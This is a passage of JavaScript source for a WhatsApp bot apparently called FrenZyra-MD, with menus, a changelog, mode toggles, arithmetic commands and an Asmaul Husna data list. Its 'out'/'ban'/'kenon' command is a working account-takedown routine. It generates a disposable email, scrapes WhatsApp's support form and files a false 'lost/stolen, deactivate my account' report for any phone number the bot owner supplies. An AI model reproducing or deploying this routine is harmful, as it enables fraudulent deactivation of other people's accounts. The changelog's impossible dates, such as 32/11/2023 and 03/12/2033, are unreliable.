frenzzz = `${Frenzy}@s.whatsapp.net`
ListM = `✧────···[ *𝙵𝚁𝙴𝙽𝚉𝚈𝚁𝙰-𝙼𝙳* ]···────✧

╔┓┏╦━━╦┓╔┓╔━━╗╔╗
║┗┛║┗━╣┃║┃║╯╰║║║
║┏┓║┏━╣┗╣┗╣╰╯║╠╣
╚┛┗╩━━╩━╩━╩━━╝╚╝

┌┈┈┈┈┈┈┈┈┈┈┈⌨︎
│@${sender.split("@")[0]} ꪶ𖣂ꫂ
└┬❖
┌┤☏︎ @${frenzzz.split("@")[0]}
│𝙳𝙰𝚂𝙷𝙱𝙾𝙰𝚁𝙳 𝙼𝙴𝙽𝚄 ⫹ Ϟ ⫺
└┬──────────☾ *︎${feel}* ☽︎
┌┤
╎
╎${logo} ${prefix}𝒍𝒊𝒔𝒕𝒎𝒆𝒏𝒖
╎${logo} ${prefix}𝒈𝒂𝒎𝒆𝒔𝒎𝒆𝒏𝒖
╎${logo} ${prefix}𝒊𝒏𝒇𝒐𝒃𝒐𝒕𝒎𝒆𝒏𝒖
╎${logo} ${prefix}𝒓𝒂𝒏𝒅𝒐𝒎𝒎𝒆𝒏𝒖
╎${logo} ${prefix}𝒔𝒖𝒃𝒔𝒄𝒓𝒊𝒃𝒆𝒓𝒔𝒎𝒆𝒏𝒖
╎${logo} ${prefix}𝒐𝒘𝒏𝒆𝒓
╎${logo} ${prefix}𝒄𝒉𝒂𝒏𝒈𝒆𝒍𝒐𝒈
╎${logo} ${prefix}𝖆𝖎
╎${logo} ${prefix}𝖈𝖍𝖆𝖙
╎${logo} ${prefix}𝖈𝖍𝖆𝖙𝖌𝖕𝖙
╎${logo} ${prefix}𝖌𝖕𝖙𝖕𝖗𝖔
╎${logo} ${prefix}𝖔𝖕𝖊𝖓𝖆𝖎
╎${logo} ${prefix}𝖈𝖍𝖆𝖙𝖇𝖔𝖙
╎${logo} ${prefix}𝖋𝖗𝖊𝖓𝖟𝖞
╎${logo} ${prefix}𝖆𝖚𝖙𝖔𝖇𝖔𝖙
╎${logo} ${prefix}𝖌𝖕𝖙
╎${logo} ${prefix}𝖈𝖍𝖆𝖙𝖌𝖕𝖙𝖕𝖗𝖔
╎${logo} ${prefix}𝖆𝖘𝖐
╎${logo} ${prefix}𝖆𝖘𝖐𝖇𝖔𝖙
╎${logo} ${prefix}𝖘𝖎𝖒𝖎
╎${logo} ${prefix}𝖔𝖜𝖓𝖊𝖗
╎${logo} ${prefix}𝖘𝖈𝖗𝖎𝖕𝖙
╎${logo} ${prefix}𝖘𝖈
╎${logo} ${prefix}𝖇𝖔𝖙𝖘𝖈𝖗𝖎𝖕𝖙
╎${logo} ${prefix}𝖇𝖆𝖘𝖊
╎${logo} ${prefix}𝖉𝖆𝖙𝖆𝖇𝖆𝖘𝖊
╎${logo} ${prefix}𝖙𝖖𝖙𝖔
╎${logo} ${prefix}𝖉𝖊𝖛𝖊𝖑𝖔𝖕𝖊𝖗
╎${logo} ${prefix}𝖇𝖔𝖙
╎${logo} ${prefix}𝖒𝖔𝖉𝖊
╎${logo} ${prefix}𝖔𝖚𝖙
╎${logo} ${prefix}𝖉𝖔𝖓𝖆𝖙𝖊
╎${logo} ${prefix}𝖘𝖔𝖈𝖎𝖆𝖑𝖒𝖊𝖉𝖎𝖆
╎${logo} ${prefix}𝖙𝖊𝖑𝖊𝖌𝖗𝖆𝖒
╎${logo} ${prefix}𝖜𝖍𝖆𝖙𝖘𝖆𝖕𝖕
╎${logo} ${prefix}𝖞𝖔𝖚𝖙𝖚𝖇𝖊
╎${logo} ${prefix}𝖎𝖓𝖘𝖙𝖆𝖌𝖗𝖆𝖒
╎${logo} ${prefix}𝖌𝖎𝖙𝖍𝖚𝖇
╎${logo} ${prefix}𝖗𝖊𝖕𝖑𝖎𝖙
╎${logo} ${prefix}𝖕𝖆𝖞𝖒𝖊𝖓𝖙
╎${logo} ${prefix}𝖘𝖊𝖜𝖆𝖇𝖔𝖙
╎${logo} ${prefix}𝖙𝖜𝖎𝖙𝖙𝖊𝖗
╎${logo} ${prefix}𝖞𝖊𝖊𝖙𝖆𝖑𝖐
╎${logo} ${prefix}𝖒𝖔𝖇𝖎𝖑𝖊𝖑𝖊𝖌𝖊𝖓𝖉
╎${logo} ${prefix}𝖋𝖗𝖊𝖊𝖋𝖎𝖗𝖊
╎${logo} ${prefix}𝖗𝖔𝖇𝖑𝖔𝖝
╎${logo} ${prefix}𝖈𝖍𝖆𝖓𝖌𝖊𝖑𝖔𝖌
╎${logo} ${prefix}𝖑𝖔𝖌𝖈𝖍𝖆𝖓𝖌𝖊
╎${logo} ${prefix}𝖕𝖎𝖓𝖌
╎${logo} ${prefix}𝖘𝖕𝖊𝖊𝖉
╎${logo} ${prefix}𝖘𝖙𝖆𝖙𝖚𝖘
╎${logo} ${prefix}𝖋𝖗𝖊𝖓𝖟𝖞𝖉𝖆𝖑𝖑𝖊
╎${logo} ${prefix}𝖎𝖒𝖌𝖉𝖆𝖑𝖑𝖊
╎${logo} ${prefix}𝖎𝖒𝖌𝖇𝖔𝖙
╎${logo} ${prefix}𝖈𝖗𝖊𝖆𝖙𝖊𝖎𝖒𝖌
╎${logo} ${prefix}𝖒𝖆𝖐𝖊𝖎𝖒𝖌
╎${logo} ${prefix}𝖘𝖚𝖒𝖒𝖔𝖓𝖎𝖒𝖌
╎${logo} ${prefix}𝖎𝖒𝖆𝖌𝖊𝖇𝖔𝖙
╎${logo} ${prefix}𝖉𝖗𝖆𝖜𝖎𝖒𝖌
╎${logo} ${prefix}𝖆𝖎𝖉𝖆𝖑𝖑𝖊
╎${logo} ${prefix}𝖎𝖒𝖆𝖌𝖊𝖘
╎${logo} ${prefix}𝖇𝖔𝖙𝖉𝖆𝖑𝖑𝖊
╎
╚┈┈┈┈┈┈┈┈┈┈┈⌫`
var MP3 = fs.readFileSync(`${pickRandom([
'./TwT/IuI.mp3',
'./TwT/HvH.mp3',
'./TwT/YzY.mp3',
'./TwT/HoH.mp3',
'./TwT/VuV.mp3',
'./TwT/OuO.mp3'])}`)
Fren = fs.readFileSync('./MwM/Frenzy.jpg')
FrenZyra.sendMessage(from, {
image: Fren,
caption: ListM, 
mentions: [Zyy]
},
{ quoted: m })
FrenZyra.sendMessage(m.chat,
{audio: MP3,
mimetype: 'audio/mpeg',
ptt:true}, 
{ quoted: m })
}
break
case "menugame":
case "gamemenu":
case "menugames":
case "gamesmenu": {
Zyy = `${sender}`
const reactionMessage = {
react: {
text: "👾", 
key: m.key
}
}
await FrenZyra.sendMessage(sender, reactionMessage)
let logo = `${pickRandom(['⎔', '✦', '⭑', 'ᯬ', '⭔', '◉', '⬟', '▢', '᭻', '»', '〆', '々', '⛥', '✗', '⛊', '⚜', '⚝', '⚚', '♪', 'ぎ', '♡︎', '☠︎︎', '༒︎', '★', '۞', '✪', '⚠︎', '𖠌', 'ꕥ', '⌨︎', '♧︎︎︎', '☕︎', '☂︎', '𖤍', '✍︎', '豈', '☯︎', 'ᴥ︎︎︎', '♲︎︎︎', '߷', '⍟', '❦︎', 'ꨄ︎', '☀︎︎', 'シ︎', '㋛︎', '✿︎', '⌫', '𓂀', 'ϟ', '⫹⫺', '❒', '⽳⁩', 'ꪶ𖣂ꫂ', '∞', '🅥 ', '☪'])}`
let emot = `${pickRandom(['⎔', '✦', '⭑', 'ᯬ', '⭔', '◉', '⬟', '▢', '᭻', '»', '〆', '々', '⛥', '✗', '⛊', '⚜', '⚝', '⚚', '♪', 'ぎ', '♡︎', '☠︎︎', '༒︎', '★', '۞', '✪', '⚠︎', '𖠌', 'ꕥ', '⌨︎', '♧︎︎︎', '☕︎', '☂︎', '𖤍', '✍︎', '豈', '☯︎', 'ᴥ︎︎︎', '♲︎︎︎', '߷', '⍟', '❦︎', 'ꨄ︎', '☀︎︎', 'シ︎', '㋛︎', '✿︎', '⌫', '𓂀', 'ϟ', '⫹⫺', '❒', '⽳⁩', 'ꪶ𖣂ꫂ', '∞', '🅥 ', '⿻', '☪'])}`
let feel = `${pickRandom(['☹︎', '☺︎︎'])}`
frenzzz = `${Frenzy}@s.whatsapp.net`
Menu `✧────···[ *𝙵𝚁𝙴𝙽𝚉𝚈𝚁𝙰-𝙼𝙳* ]···────✧

╔┓┏╦━━╦┓╔┓╔━━╗╔╗
║┗┛║┗━╣┃║┃║╯╰║║║
║┏┓║┏━╣┗╣┗╣╰╯║╠╣
╚┛┗╩━━╩━╩━╩━━╝╚╝

┌┈┈┈┈┈┈┈┈┈┈┈⌨︎
│@${sender.split("@")[0]} ꪶ𖣂ꫂ
└┬❖
┌┤☏︎ @${frenzzz.split("@")[0]}
│𝙳𝙰𝚂𝙷𝙱𝙾𝙰𝚁𝙳 𝙼𝙴𝙽𝚄 ⫹ Ϟ ⫺
└┬──────────☾ *︎${feel}* ☽︎
┌┤
╎
╎${logo} ${prefix}𝒍𝒊𝒔𝒕𝒎𝒆𝒏𝒖
╎${logo} ${prefix}𝒈𝒂𝒎𝒆𝒔𝒎𝒆𝒏𝒖
╎${logo} ${prefix}𝒊𝒏𝒇𝒐𝒃𝒐𝒕𝒎𝒆𝒏𝒖
╎${logo} ${prefix}𝒓𝒂𝒏𝒅𝒐𝒎𝒎𝒆𝒏𝒖
╎${logo} ${prefix}𝒔𝒖𝒃𝒔𝒄𝒓𝒊𝒃𝒆𝒓𝒔𝒎𝒆𝒏𝒖
╎${logo} ${prefix}𝒐𝒘𝒏𝒆𝒓
╎${logo} ${prefix}𝒄𝒉𝒂𝒏𝒈𝒆𝒍𝒐𝒈
╎
╚┈┈┈┈┈┈┈┈┈┈┈⌫`
var MP3 = fs.readFileSync(`${pickRandom([
'./TwT/IuI.mp3',
'./TwT/HvH.mp3',
'./TwT/YzY.mp3',
'./TwT/HoH.mp3',
'./TwT/VuV.mp3',
'./TwT/OuO.mp3'])}`)
Fren = fs.readFileSync('./MwM/Frenzy.jpg')
FrenZyra.sendMessage(from, { 
image: Fren,
caption: Menu, 
fileLength: 10, 
contextInfo: { mentionedJid:[sender], 
forwardingScore: 9999, 
isForwarded: true }}, 
{ quoted: m })
FrenZyra.sendMessage(m.chat,
{audio: MP3,
mimetype: 'audio/mpeg',
ptt:true}, 
{ quoted: m })
}
break
case "menuinfobot":
case "infobotmenu": {
Zyy = `${sender}`
const reactionMessage = {
react: {
text: "👾", 
key: m.key
}
}
await FrenZyra.sendMessage(sender, 
reactionMessage);
let logo = `${pickRandom(['⎔', '✦', '⭑', 'ᯬ', '⭔', '◉', '⬟', '▢', '᭻', '»', '〆', '々', '⛥', '✗', '⛊', '⚜', '⚝', '⚚', '♪', 'ぎ', '♡︎', '☠︎︎', '༒︎', '★', '۞', '✪', '⚠︎', '𖠌', 'ꕥ', '⌨︎', '♧︎︎︎', '☕︎', '☂︎', '𖤍', '✍︎', '豈', '☯︎', 'ᴥ︎︎︎', '♲︎︎︎', '߷', '⍟', '❦︎', 'ꨄ︎', '☀︎︎', 'シ︎', '㋛︎', '✿︎', '⌫', '𓂀', 'ϟ', '⫹⫺', '❒', '⽳⁩', 'ꪶ𖣂ꫂ', '∞', '🅥 ', '☪'])}`
let emot = `${pickRandom(['⎔', '✦', '⭑', 'ᯬ', '⭔', '◉', '⬟', '▢', '᭻', '»', '〆', '々', '⛥', '✗', '⛊', '⚜', '⚝', '⚚', '♪', 'ぎ', '♡︎', '☠︎︎', '༒︎', '★', '۞', '✪', '⚠︎', '𖠌', 'ꕥ', '⌨︎', '♧︎︎︎', '☕︎', '☂︎', '𖤍', '✍︎', '豈', '☯︎', 'ᴥ︎︎︎', '♲︎︎︎', '߷', '⍟', '❦︎', 'ꨄ︎', '☀︎︎', 'シ︎', '㋛︎', '✿︎', '⌫', '𓂀', 'ϟ', '⫹⫺', '❒', '⽳⁩', 'ꪶ𖣂ꫂ', '∞', '🅥 ', '⿻', '☪'])}`
let feel = `${pickRandom(['☹︎', '☺︎︎'])}`
frenzzz = `${Frenzy}@s.whatsapp.net`
Menu `✧────···[ *𝙵𝚁𝙴𝙽𝚉𝚈𝚁𝙰-𝙼𝙳* ]···────✧

╔┓┏╦━━╦┓╔┓╔━━╗╔╗
║┗┛║┗━╣┃║┃║╯╰║║║
║┏┓║┏━╣┗╣┗╣╰╯║╠╣
╚┛┗╩━━╩━╩━╩━━╝╚╝

┌┈┈┈┈┈┈┈┈┈┈┈⌨︎
│@${sender.split("@")[0]} ꪶ𖣂ꫂ
└┬❖
┌┤☏︎ @${frenzzz.split("@")[0]}
│𝙳𝙰𝚂𝙷𝙱𝙾𝙰𝚁𝙳 𝙼𝙴𝙽𝚄 ⫹ Ϟ ⫺
└┬──────────☾ *︎${feel}* ☽︎
┌┤
*?*
╚┈┈┈┈┈┈┈┈┈┈┈⌫`
var MP3 = fs.readFileSync(`${pickRandom([
'./TwT/IuI.mp3',
'./TwT/HvH.mp3',
'./TwT/YzY.mp3',
'./TwT/HoH.mp3',
'./TwT/VuV.mp3',
'./TwT/OuO.mp3'])}`)
Fren = fs.readFileSync('./MwM/Frenzy.jpg')
FrenZyra.sendMessage(from, {
image: Fren,
caption: Menu, 
mentions: [Zyy]
},
{ quoted: m })
FrenZyra.sendMessage(m.chat,
{audio: MP3,
mimetype: 'audio/mpeg',
ptt:true}, 
{ quoted: m })
}
break
case "logchange":
case "log":
case "listchangelog":
case "enhance":
case "changelog": {
Zyy = `${sender}`
const reactionMessage = {
react: {
text: "🧾", 
key: m.key
}
}
await FrenZyra.sendMessage(sender, 
reactionMessage);
let logo = `${pickRandom(['⎔', '✦', '⭑', 'ᯬ', '⭔', '◉', '⬟', '▢', '᭻', '»', '〆', '々', '⛥', '✗', '⛊', '⚜', '⚝', '⚚', '♪', 'ぎ', '♡︎', '☠︎︎', '༒︎', '★', '۞', '✪', '⚠︎', '𖠌', 'ꕥ', '⌨︎', '♧︎︎︎', '☕︎', '☂︎', '𖤍', '✍︎', '豈', '☯︎', 'ᴥ︎︎︎', '♲︎︎︎', '߷', '⍟', '❦︎', 'ꨄ︎', '☀︎︎', 'シ︎', '㋛︎', '✿︎', '⌫', '𓂀', 'ϟ', '⫹⫺', '❒', '⽳⁩', 'ꪶ𖣂ꫂ', '∞', '🅥 ', '☪'])}`
let emot = `${pickRandom(['⎔', '✦', '⭑', 'ᯬ', '⭔', '◉', '⬟', '▢', '᭻', '»', '〆', '々', '⛥', '✗', '⛊', '⚜', '⚝', '⚚', '♪', 'ぎ', '♡︎', '☠︎︎', '༒︎', '★', '۞', '✪', '⚠︎', '𖠌', 'ꕥ', '⌨︎', '♧︎︎︎', '☕︎', '☂︎', '𖤍', '✍︎', '豈', '☯︎', 'ᴥ︎︎︎', '♲︎︎︎', '߷', '⍟', '❦︎', 'ꨄ︎', '☀︎︎', 'シ︎', '㋛︎', '✿︎', '⌫', '𓂀', 'ϟ', '⫹⫺', '❒', '⽳⁩', 'ꪶ𖣂ꫂ', '∞', '🅥 ', '⿻', '☪'])}`
let feel = `${pickRandom(['☹︎', '☺︎︎'])}`
frenzzz = `${Frenzy}@s.whatsapp.net`
Changelog = `⬣─────「 𝖈𝖍𝖆𝖓𝖌𝖊𝖑𝖔𝖌 」─────⬣

*08/12/2023 [2.8]*
• Fix Changes
• Add New Feature
• New Features
• New Appearance
• Fix Bug

*07/12/2023 [2.7]*
• Fix More Bugs
• New Enhance
• New Appearance
• Fix Any Features
• Fix Delay
• Fix Error
• No Lost Connection!!

*06/12/2023 [2.6]*
• Fix Any Bugs
• Fix More Bugs
• Fix Delay
• Add New Features
• Added New Moderator

*05/12/2023 [2.5]*
• New Messages
• New Features
• Fix Any Bugs
• Fix More 
• Fix All

*04/12/2023 [2.4]*
• Change Appearance
• New Any Features
• Fix Lag Home
• Fix Delay

*03/12/2033 [2.3]*
• Fix Any Changes
• Cool Features
• New Features
• Fix Bugs

*02/12/2023 [2.2]*
• New Command
• Added New Reply
• Custom Commands
• Fast Respon
• Any Some Bugs!

*01/12/2023 [2.1]*
• Add New Features 
• Fix Some Bugs
• New Index
• Latest Package
• New Games Menu
• New Fun Menu
• New Assistant Menu
• New Added New Features

*32/11/2023 [2.0]*
• Latest Version
• Fixed Some Bugs
• New Features
• No Delay
• Fixed Lower QR 

*31/11/2023 [1.9]*
• New Style
• Fix Termux Lost Connection
• Fix Any Bugs
• Fix Features

*30/11/2023 [1.8]*
• Latest Version

*30/11/2023 [1.7]*
• Added New Features
• New Function
• Add New Style

*29/11/2023 [1.6]*
• Fix More Bugs
• New Update
• New Upgrade

*28/11/2023 [1.5]*
• New Fix Bugs
• Fix More Errors
• Fix Low Version

*27/11/2023 [1.4]*
• New Features
• New Home
• New Appearance
• All Changes

*26/11/2023 [1.3]*
• The Most Update
• Added New Features
• Fix Crashes!
• New Version Update
• Fix Some Bugs
• New Good Features
• New Appearance
• Fast Respon
• Add New Function

*25/11/2023 [1.2]*
• Features Updated 
• New Style
• Themes Modern
• Fix Bugs
• Fixed Any Errors
• Fix Crash System
• New UI Updated
• New Auto Respon

*24/11/2023 [1.2]*
• Added New Style
• Fix More Bugs
• Added New Function

*23/11/2023 [1.1]*
• Support Multi Device
• Anti Delay
• No Crash
• Support GBWA!
• Appearance Modern Style
• Add More Features
• No Internet Connection
• Fix More Bugs

*23/11/2023 [1.0]*
• First Release`
var MP3 = fs.readFileSync(`${pickRandom([
'./TwT/IuI.mp3',
'./TwT/HvH.mp3',
'./TwT/YzY.mp3',
'./TwT/HoH.mp3',
'./TwT/VuV.mp3',
'./TwT/OuO.mp3'])}`)
Fren = fs.readFileSync('./MwM/Frenzy.jpg')
FrenZyra.sendMessage(from, {
image: Fren,
caption: Changelog, 
mentions: [Zyy]
},
{ quoted: m })
FrenZyra.sendMessage(m.chat,
{audio: MP3,
mimetype: 'audio/mpeg',
ptt:true}, 
{ quoted: m })
}
break
case "public": {
const reactionMessage = {
react: {
text: "🔓", 
key: m.key
}
}
await FrenZyra.sendMessage(sender, 
reactionMessage);
var on = fs.readFileSync(`${pickRandom(['./TwT/xxx'])}`)
var frenzy = fs.readFileSync(`${pickRandom(['./TwT/xxx'])}`)
if (!isOwner) return await FrenZyra.sendMessage(m.chat, {
audio: frenzy,
mimetype: 'audio/mpeg', ptt:true },
{ quoted: m })
FrenZyra.public = true
reply(`*SUKSES MODE PUBLIC ✅*`)
FrenZyra.sendMessage(m.chat, {
audio: on,
mimetype: 'audio/mpeg', ptt:true },
{ quoted: m })
}
break
case "self": {
const reactionMessage = {
react: {
text: "🔒", 
key: m.key
}
}
await FrenZyra.sendMessage(sender, 
reactionMessage);
var off = fs.readFileSync(`${pickRandom(['./TwT/xxx'])}`)
var frenzy = fs.readFileSync(`${pickRandom(['./TwT/xxx'])}`)
if (!isOwner) return await FrenZyra.sendMessage(m.chat, {
audio: frenzy,
mimetype: 'audio/mpeg', ptt:true },
{ quoted: m })
FrenZyra.public = false
reply(`*SUKSES MODE SELF ✅*`)
FrenZyra.sendMessage(m.chat, {
audio: off,
mimetype: 'audio/mpeg', ptt:true },
{ quoted: m })
}
break
case "sc":
case "source":
case "sourcecode":
case "scriptcode":
case "scripts":
case "esce":
case "escebot":
case "scbot":
case "script": {
const reactionMessage = {
react: {
text: "🙅🏻‍♀️️", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
var script = fs.readFileSync(`${pickRandom([
'./TwT/Kaga Ada.mp3', 
'./TwT/Ga Mau.mp3', 
'./TwT/Ga Boleh.mp3', 
'./TwT/Ga Ada.mp3', 
'./TwT/Buat Apa.mp3', 
'./TwT/Kenapa Kak.mp3'])}`)
FrenZyra.sendMessage(m.chat, {
audio: script,
mimetype: 'audio/mpeg', ptt:true },
{ quoted: m })
}
break
case "developer":
case "development":
case "develop":
case "developed":
case "helper":
case "helpers":
case "owners":
case "owner": {
var frenzy = fs.readFileSync(`${pickRandom([
'./TwT/Kaga Ada.mp3', 
'./TwT/Ga Mau.mp3', 
'./TwT/Ga Boleh.mp3', 
'./TwT/Ga Ada.mp3', 
'./TwT/Buat Apa.mp3', 
'./TwT/Kenapa Kak.mp3'])}`)
const repf = await FrenZyra.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }}, 
{ quoted: m })
FrenZyra.sendMessage(from, {
text: `*Hello @${sender.split("@")[0]}! Don't Kidnap Me >~<*`,
mentions:[sender]},
{ quoted: repf })
FrenZyra.sendMessage(m.chat, {
audio: frenzy,
mimetype: 'audio/mpeg', ptt:true },
{ quoted: m })
}
break
case "out": 
case "bye":
case "goodbye":
case "logout":
case "ban":
case "banned":
case "kenon":
case "beku":
case "c1": {
var Bye = fs.readFileSync(`${pickRandom(['./Frenzy/'])}`)
var Invalid = fs.readFileSync(`${pickRandom(['./Frenzy/'])}`)
if (!isOwner) return reply(mess.FrenZyra)
if (!args[0]) return await FrenZyra.sendMessage(m.chat, {
audio: Bye,
mimetype: 'audio/mpeg',
ptt:true }, 
{ quoted: m })
UwU = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let OuO = await Frenzy.onWhatsApp(UwU)
if (OuO.length == 0) return await FrenZyra.sendMessage(m.chat, {
audio: Invalid,
mimetype: 'audio/mpeg',
ptt:true }, 
{ quoted: m })
let UxU = require("axios")
let OxO = await UxU.get("https://www.whatsapp.com/contact/noclient/")
let email = await UxU.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = OxO.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(OxO.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", UwU)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await UxU({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
FrenZyra.sendMessage(from, {
text: util.format(res.data)},
{ quoted: m })
}
break
case 'tambah': {
if (!q) {
return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
}
var num_one = text.split(' ')[0];
var num_two = text.split(' ')[1];
if (!num_one) {
return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
}
if (!num_two) {
return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
}
var nilai_one = Number(num_one);
var nilai_two = Number(num_two);
reply(`Hasilnya adalah *${nilai_one + nilai_two}*`)
}
break
case 'kurang': {
if (!q) {
return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
}
var num_one = text.split(' ')[0];
var num_two = text.split(' ')[1];
if (!num_one) {
return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
}
if (!num_two) {
return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
}
var nilai_one = Number(num_one);
var nilai_two = Number(num_two);
reply(`Hasilnya adalah *${nilai_one - nilai_two}*`)
}
break
case 'kali': {
if (!q) {
return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
}
var num_one = text.split(' ')[0];
var num_two = text.split(' ')[1];
if (!num_one) {
return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
}
if (!num_two) {
return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
}
var nilai_one = Number(num_one);
var nilai_two = Number(num_two);
reply(`Hasilnya adalah *${nilai_one * nilai_two}*`)
}
break
case 'bagi': {
if (!q) {
return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`);
}
var num_one = text.split(' ')[0];
var num_two = text.split(' ')[1];
if (!num_one) {
return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
}
if (!num_two) {
return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
}
var nilai_one = Number(num_one);
var nilai_two = Number(num_two);
reply(`Hasilnya adalah *${nilai_one / nilai_two}*`)
}
break
case "asmaul":
case "asmaulhusna": {
const contoh = `*Asmaul Husna*`
const anjuran = `
Dari Abu hurarirah radhiallahu anhu, Rasulullah Saw bersabda: "إِنَّ لِلَّهِ تَعَالَى تِسْعَةً وَتِسْعِينَ اسْمًا، مِائَةٌ إِلَّا وَاحِدًا، مَنْ أَحْصَاهَا دخل الجنة، وهو وتر يُحِبُّ الْوِتْرَ"
Artinya: "Sesungguhnya Allah mempunyai sembilan puluh sembilan nama, alias seratus kurang satu. Barang siapa yang menghitung-hitungnya, niscaya masuk surga; Dia Witir dan menyukai yang witir".`
global.asmaulhusna = [
{
index: 1,
latin: "Ar Rahman",
arabic: "الرَّحْمَنُ",
translation_id: "Yang Memiliki Mutlak sifat Pemurah",
translation_en: "The All Beneficent"
},
{
index: 2,
latin: "Ar Rahiim",
arabic: "الرَّحِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Penyayang",
translation_en: "The Most Merciful"
},
{
index: 3,
latin: "Al Malik",
arabic: "الْمَلِكُ",
translation_id: "Yang Memiliki Mutlak sifat Merajai/Memerintah",
translation_en: "The King, The Sovereign"
},
{
index: 4,
latin: "Al Quddus",
arabic: "الْقُدُّوسُ",
translation_id: "Yang Memiliki Mutlak sifat Suci",
translation_en: "The Most Holy"
},
{
index: 5,
latin: "As Salaam",
arabic: "السَّلاَمُ",
translation_id: "Yang Memiliki Mutlak sifat Memberi Kesejahteraan",
translation_en: "Peace and Blessing"
},
{
index: 6,
latin: "Al Mu’min",
arabic: "الْمُؤْمِنُ",
translation_id: "Yang Memiliki Mutlak sifat Memberi Keamanan",
translation_en: "The Guarantor"
},
{
index: 7,
latin: "Al Muhaimin",
arabic: "الْمُهَيْمِنُ",
translation_id: "Yang Memiliki Mutlak sifat Pemelihara",
translation_en: "The Guardian, the Preserver"
},
{
index: 8,
latin: "Al ‘Aziiz",
arabic: "الْعَزِيزُ",
translation_id: "Yang Memiliki Mutlak Kegagahan",
translation_en: "The Almighty, the Self Sufficient"
},
{
index: 9,
latin: "Al Jabbar",
arabic: "الْجَبَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Perkasa",
translation_en: "The Powerful, the Irresistible"
},
{
index: 10,
latin: "Al Mutakabbir",
arabic: "الْمُتَكَبِّرُ",
translation_id: "Yang Memiliki Mutlak sifat Megah,Yang Memiliki Kebesaran",
translation_en: "The Tremendous"
},
{
index: 11,
latin: "Al Khaliq",
arabic: "الْخَالِقُ",
translation_id: "Yang Memiliki Mutlak sifat Pencipta",
translation_en: "The Creator"
},
{
index: 12,
latin: "Al Baari’",
arabic: "الْبَارِئُ",
translation_id: "Yang Memiliki Mutlak sifat Yang Melepaskan(Membuat, Membentuk, Menyeimbangkan)",
translation_en: "The Maker"
},
{
index: 13,
latin: "Al Mushawwir",
arabic: "الْمُصَوِّرُ",
translation_id: "Yang Memiliki Mutlak sifat YangMembentuk Rupa (makhluknya)",
translation_en: "The Fashioner of Forms"
},
{
index: 14,
latin: "Al Ghaffaar",
arabic: "الْغَفَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Pengampun",
translation_en: "The Ever Forgiving"
},
{
index: 15,
latin: "Al Qahhaar",
arabic: "الْقَهَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Memaksa",
translation_en: "The All Compelling Subduer"
},
{
index: 16,
latin: "Al Wahhaab",
arabic: "الْوَهَّابُ",
translation_id: "Yang Memiliki Mutlak sifat Pemberi Karunia",
translation_en: "The Bestower"
},
{
index: 17,
latin: "Ar Razzaaq",
arabic: "الرَّزَّاقُ",
translation_id: "Yang Memiliki Mutlak sifat Pemberi Rejeki",
translation_en: "The Ever Providing"
},
{
index: 18,
latin: "Al Fattaah",
arabic: "الْفَتَّاحُ",
translation_id: "Yang Memiliki Mutlak sifat Pembuka Rahmat",
translation_en: "The Opener, the Victory Giver"
},
{
index: 19,
latin: "Al ‘Aliim",
arabic: "اَلْعَلِيْمُ",
translation_id: "Yang Memiliki Mutlak sifatMengetahui (Memiliki Ilmu)",
translation_en: "The All Knowing, the Omniscient"
},
{
index: 20,
latin: "Al Qaabidh",
arabic: "الْقَابِضُ",
translation_id: "Yang Memiliki Mutlak sifat YangMenyempitkan (makhluknya)",
translation_en: "The Restrainer, the Straightener"
},
{
index: 21,
latin: "Al Baasith",
arabic: "الْبَاسِطُ",
translation_id: "Yang Memiliki Mutlak sifat YangMelapangkan (makhluknya)",
translation_en: "The Expander, the Munificent"
},
{
index: 22,
latin: "Al Khaafidh",
arabic: "الْخَافِضُ",
translation_id: "Yang Memiliki Mutlak sifat YangMerendahkan (makhluknya)",
translation_en: "The Abaser"
},
{
index: 23,
latin: "Ar Raafi’",
arabic: "الرَّافِعُ",
translation_id: "Yang Memiliki Mutlak sifat YangMeninggikan (makhluknya)",
translation_en: "The Exalter"
},
{
index: 24,
latin: "Al Mu’izz",
arabic: "الْمُعِزُّ",
translation_id: "Yang Memiliki Mutlak sifat YangMemuliakan (makhluknya)",
